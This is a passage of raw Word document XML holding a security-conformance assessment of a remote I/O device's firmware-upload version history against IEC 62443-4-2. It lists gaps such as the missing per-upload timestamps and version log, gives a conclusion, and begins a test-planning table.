            <w:hyperlink r:id="rId324" w:history="1">
              <w:r w:rsidRPr="009E77F2">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>[218_SRIO_M...e_RemoteIO | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="6C8C1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6D534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t>SysCom update event</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (UPDATE_COMPLETED)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DFDF1" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t>SRIO-10785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3B60E" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">The device </w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>observes</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> each upload — but as </w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>RQ-008's transient event</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">, not a retained version-history entry. </w:t>
            </w:r>
            <w:hyperlink r:id="rId325" w:history="1">
              <w:r w:rsidRPr="00BA4097">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00BA4097">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>Market_Acc</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00BA4097">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00BA4097">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>ty_Systems</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00BA4097">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="05227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DDB2A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 xml:space="preserve">Remanent </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>audit</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>state</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>exists</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve"> (REVISION_COUNTER)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DBAFE" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t>SRIO-3002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B68DA" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Proves the device </w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>can</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> persist small remanent audit state — yet keeps </w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>no FW-upload version history</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (design omission).</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>(REVISION_COUNTER itself = RQ-009 config-modification.)</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:hyperlink r:id="rId326" w:history="1">
              <w:r w:rsidRPr="00BA4097">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00BA4097">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00BA4097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164D1AD2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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Gaps (version-history-retention-scoped):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="270AABEE" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="51"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>G-1 (no per-upload historical record — accurate; framed as design omission).</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The device stores </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>only the current version</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; there is </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no append-only, per-device, per-upload version history</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. It </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>witnesses</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> every upload (RQ-008's UPDATE_COMPLETED) and </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>can</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> hold remanent audit state (REVISION_COUNTER is remanent), so this is a </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>design omission, not a capability limit</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:hyperlink r:id="rId327" w:history="1">
        <w:r w:rsidRPr="00BA4097">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00BA4097">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Market_Acc</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00BA4097">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00BA4097">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ty_Systems</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00BA4097">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00BA4097">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId328" w:history="1">
        <w:r w:rsidRPr="00BA4097">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00BA4097">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00BA4097">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5F72816E" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="51"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-2 (no per-upload timestamp — decisive; the bulletproof finding).</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> "5 years </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>after each upload</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">" requires a </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>per-upload absolute timestamp</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. With </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no RTC</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>uptime reset on cold start</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (and the install </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>forces</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> a cold start), the device </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cannot timestamp an upload at all</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — so even a hypothetical history would be </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>undatable</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, and the per-upload retention clock </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cannot be started</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. This is the finding </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no external record can cure for a specific physical unit</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:hyperlink r:id="rId329" w:history="1">
        <w:r w:rsidRPr="00BA4097">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00BA4097">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00BA4097">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="46DC4D1A" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="51"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-3 (Release Notes deficiencies — accurate, keep).</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Not device-resident, not per-serial, not tamper-evident, no guaranteed 5-year per-upload retention, no per-upload timestamp. </w:t>
      </w:r>
      <w:hyperlink r:id="rId330" w:history="1">
        <w:r w:rsidRPr="00BA4097">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[218_SRIO_M...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00BA4097">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00BA4097">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0C86A6C1" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="51"/>
        </w:numPr>
      </w:pPr>
      <w:del w:id="32" w:author="Unknown">
        <w:r w:rsidRPr="009E77F2">
          <w:rPr>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>G (self-erasing install; circular-buffer/cold-start clearing)</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Cross-referenced:</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> install-reboot self-erasing → </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-008 G-3</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; general circular-buffer/cold-start retention → </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-012 G-1/G-2</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:t xml:space="preserve">Not </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t>re-owned</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t>here</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24B7F875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rFonts w:ascii="Segoe UI Symbol" w:hAnsi="Segoe UI Symbol" w:cs="Segoe UI Symbol"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>⚠</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Citation caution (retained, protects the thesis):</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> You cite </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>prEN 50742 §7.3.1</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> as "explicitly excluding SW-version storage from the tracing log." I </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cannot verify</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> this draft clause, and — read literally — such an exclusion would </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>weaken</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> your gap (it would legitimise off-device version control). Present it as a </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>normative-interpretation question, flagged "to be confirmed,"</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and rest the non-conformity on the </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>verifiable device facts (G-1/G-2)</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, not the draft clause. </w:t>
      </w:r>
      <w:hyperlink r:id="rId331" w:history="1">
        <w:r w:rsidRPr="009E77F2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[IEC62443_4_2_source | Txt]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="40C358C6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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SL/conformance conclusion:</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-013 is </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>not met on the device</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> for a </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>per-upload, timestamped, retained</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> version log: it exposes only the </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>current</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> version (CR 6.1 partial), </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>witnesses but does not retain</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> each upload as history (G-1), and </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cannot timestamp</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> uploads at all (G-2, decisive). Whether this constitutes MVO non-conformity </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>depends on a normative question</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (does the obligation permit manufacturer-side version control?) — the </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>device-level, unambiguous finding is the absence of per-upload timestamping</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, which no external Release-Note can supply for a specific unit.</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(General retention → RQ-012; upload event → RQ-008.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21318D95" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00BA4097">
        <w:pict w14:anchorId="735B356A">
          <v:rect id="_x0000_i1879" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="051144F4" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="009E77F2" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 2 — Methodological Test Planning (Scope-Corrected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="028F047C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 xml:space="preserve">A </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>conformance-disproof</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> requirement focused on </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>version-upload</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> history + timestamp.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3892"/>
        <w:gridCol w:w="1704"/>
        <w:gridCol w:w="2511"/>
        <w:gridCol w:w="632"/>
      </w:tblGrid>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="2DDBAA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ABB33B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07C264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B94CA6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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097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BE395E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 xml:space="preserve">Scientific </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097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ABCCC6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SVV</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="48F55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88475" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
